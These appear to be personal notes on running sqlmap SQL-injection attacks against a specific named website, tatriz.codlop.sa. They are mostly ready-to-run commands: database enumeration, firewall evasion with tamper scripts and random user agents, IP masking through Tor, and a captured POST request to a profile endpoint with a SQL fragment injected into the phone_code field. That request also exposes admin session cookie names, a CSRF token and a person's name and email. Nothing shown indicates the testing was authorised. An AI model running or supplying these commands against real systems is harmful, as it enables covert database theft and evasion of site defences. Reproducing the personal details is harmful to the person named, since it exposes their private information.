
# Download
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
```


# Basic SQL Injection Test
```bash
python3 sqlmap.py -u "http://tatriz.codlop.sa/header-search?query=9" --batch --level=1
```
`-u`: Target URL with parameter
`--batch`: Automatic responses (no prompts)
`--level`: Level of tests (1–5; higher = more aggressive)


# After a successful injection is found
```bash
python3 sqlmap.py -u "http://tatriz.codlop.sa/header-search?query=9" --level=2 --risk=1 --dbs
```

`--risk=1`
This option sets the **risk level** of the SQL injection tests performed.
- **Range**: 0 to 3 (default is 1)
- **Meaning**:
    - `1`: **Low risk** — safe and fast tests (default)
    - `2`: Adds **more risky** payloads (e.g., some time-based tests)
    - `3`: Includes **high-risk** tests that may be slower or more intrusive

 `--dbs`
This tells `sqlmap` to **enumerate (list) the databases** on the server _after_ confirming that the site is vulnerable.
- Only runs **after a successful injection** is found.
> 🧠 Think of `--dbs` as saying: _"Now that we know this is injectable, show me the list of databases."_


# To bypass [[Web Application Firewall (WAF)]]:

- Use `--tamper` scripts in `sqlmap`
- Add `--random-agent` to fake User-Agent
- Slow down requests using `--delay`
- Use `--tor` or proxies to rotate IPs

```bash
sudo python3 sqlmap.py -u "http://tatriz.codlop.sa/header-search?query=9" --level=2 --risk=2 --delay=1 --random-agent
```

```bash
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor --random-agent --delay=2
```
`--tor`: Enables Tor routing through `127.0.0.1:9050`
`--check-tor`: Confirms that Tor is working and IP is masked
`--delay=X`: Add delay between requests
`--tor-type=SOCKS5`: (Optional, default is SOCKS5)
`--random-agent`: Random User-Agent headers


# Update
**Update sqlmap regularly**
To update it later, run:
```bash
cd /opt/sqlmap
git pull
```
This pulls the latest changes from the sqlmap developers.


# Post request 

**Create a raw request file**
```http
POST /profile/update HTTP/1.1
Host: tatriz.codlop.sa
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKfVzy9cMgnsLEPAR
X-Requested-With: XMLHttpRequest
Origin: https://tatriz.codlop.sa
Referer: https://tatriz.codlop.sa/profile
Cookie: remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=...; XSRF-TOKEN=...; laravel_session=...; tatriz_admin_session=...; tatriz_web_session=...

------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="_token"

gYawk2vbmKYZQLd0Y0eCIzjMhbzIca7vRjiukD7b
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="first_name"

Ammar
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="last_name"

Hamdy AlShaar
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="email"

am4@tt.com
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="phone_code"

(SELECT 20 FROM )
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="country_id"

5
------WebKitFormBoundaryKfVzy9cMgnsLEPAR
Content-Disposition: form-data; name="phone"


------WebKitFormBoundaryKfVzy9cMgnsLEPAR--
```
**Run `sqlmap` using that file**
```bash
sqlmap -r request.txt --level=3 --risk=2 --random-agent --threads=5
```
The `--threads=5` option in **`sqlmap`** tells it to use **5 concurrent HTTP threads**

**Focus testing on a parameter (optional)**
```bash
sqlmap -r request.txt -p phone_code
```

```bash
python3 /opt/sqlmap/sqlmap.py -r phone-code-i --level=3 --risk=2 --random-agent -p phone_code
```


## Notes:
- `--dbms=mysql` tells sqlmap **not to waste time** fingerprinting and trying other database types.
- You can specify other DBMS types like:
    - `--dbms=postgresql`
    - `--dbms=mssql`
    - `--dbms=oracle`
    - `--dbms=sqlite`